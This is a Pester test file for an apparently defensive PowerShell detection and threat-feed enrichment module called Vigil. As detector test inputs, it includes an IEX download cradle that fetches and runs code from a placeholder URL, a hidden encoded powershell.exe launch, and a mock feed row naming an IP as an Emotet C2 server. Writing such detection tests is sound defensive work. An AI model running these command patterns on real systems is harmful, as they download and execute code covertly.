# Pester v5 tests for the reference Vigil module - REAL tests, not happy-path-only.
# `make demo` runs these with a coverage floor; your suite should grow alongside them.
#
# The two things the copilot reliably omits and this file demonstrates:
#   * Should -Invoke mocks of an external edge (Import-Csv inside Invoke-VigilEnrichment).
#   * Unhappy-path assertions (bad input, a mocked failure) - not a replay of the demo.

Describe 'Get-VigilEvent' {
    BeforeAll {
        Import-Module "$PSScriptRoot/Vigil/Vigil.psd1" -Force
    }

    It 'emits typed objects from a JSON export' {
        $events = Get-VigilEvent -Path "$PSScriptRoot/data/heldout/malicious.json"
        $events[0] | Should -BeOfType ([pscustomobject])
        $events.Count | Should -Be 7
    }

    It 'rejects a non-existent path (parameter validation, an unhappy path)' {
        { Get-VigilEvent -Path './does-not-exist.json' } | Should -Throw
    }
}

Describe 'Get-VigilDetection' {
    BeforeAll {
        Import-Module "$PSScriptRoot/Vigil/Vigil.psd1" -Force
    }

    It 'classifies an IEX download cradle as malicious' {
        $e = [pscustomobject]@{ Id = 4104; Message = "IEX (New-Object Net.WebClient).DownloadString('http://x/y')" }
        ($e | Get-VigilDetection).Predicted | Should -Be 'malicious'
    }

    It 'classifies a benign Get-Process scriptblock as benign' {
        $e = [pscustomobject]@{ Id = 4104; Message = 'Get-Process | Sort-Object CPU -Descending' }
        ($e | Get-VigilDetection).Predicted | Should -Be 'benign'
    }

    It 'matches attacker casing (iex, -Enc) case-insensitively - unhappy for a naive -cmatch' {
        $e = [pscustomobject]@{ Id = 4688; Message = 'powershell.exe -NoP -W Hidden -Enc SQBFAFgA' }
        ($e | Get-VigilDetection).Predicted | Should -Be 'malicious'
    }

    It 'does not flag a benign message that merely mentions the word base64 (specificity)' {
        $e = [pscustomobject]@{ Id = 4104; Message = '# base64 encoding is used for the transport header' }
        ($e | Get-VigilDetection).Predicted | Should -Be 'benign'
    }

    It 'treats an event with no Message as benign (does not crash on missing field)' {
        # An unhappy path: a malformed event missing the Message property must not throw and
        # must not be flagged - a detection that crashes on odd input is worse than useless.
        $e = [pscustomobject]@{ Id = 4104 }
        $verdict = $e | Get-VigilDetection
        $verdict.Predicted | Should -Be 'benign'
    }

    It 'rejects a null explicit -InputObject (parameter validation)' {
        { Get-VigilDetection -InputObject $null } | Should -Throw
    }
}

Describe 'Invoke-VigilEnrichment (mocked feed edge)' {
    BeforeAll {
        Import-Module "$PSScriptRoot/Vigil/Vigil.psd1" -Force
        # A tiny real feed file so the -FeedPath validation (Test-Path) passes; the READ is mocked.
        $script:feedFile = Join-Path $TestDrive 'feed.csv'
        'dst_ip,malware,c2_status,first_seen_utc' | Set-Content -Path $script:feedFile
    }

    It 'reads the feed exactly once even for duplicate indicators (Should -Invoke)' {
        Mock -CommandName Import-Csv -ModuleName Vigil -MockWith {
            @([pscustomobject]@{ dst_ip = '185.220.101.7'; malware = 'Emotet'; c2_status = 'online'; first_seen_utc = '2026-01-01' })
        }
        $null = '185.220.101.7', '185.220.101.7', '10.0.0.1' |
            Invoke-VigilEnrichment -FeedPath $script:feedFile
        # The feed is loaded once on the calling thread - not once per indicator.
        Should -Invoke -CommandName Import-Csv -ModuleName Vigil -Times 1 -Exactly
    }

    It 'flags a known-malicious indicator from the mocked feed' {
        Mock -CommandName Import-Csv -ModuleName Vigil -MockWith {
            @([pscustomobject]@{ dst_ip = '185.220.101.7'; malware = 'Emotet'; c2_status = 'online'; first_seen_utc = '2026-01-01' })
        }
        $r = '185.220.101.7' | Invoke-VigilEnrichment -FeedPath $script:feedFile
        $r.Malicious | Should -BeTrue
        $r.Malware   | Should -Be 'Emotet'
    }

    It 'surfaces a feed-read failure instead of hiding it (unhappy path)' {
        Mock -CommandName Import-Csv -ModuleName Vigil -MockWith { throw 'feed read timeout' }
        { '1.2.3.4' | Invoke-VigilEnrichment -FeedPath $script:feedFile } | Should -Throw
    }
}
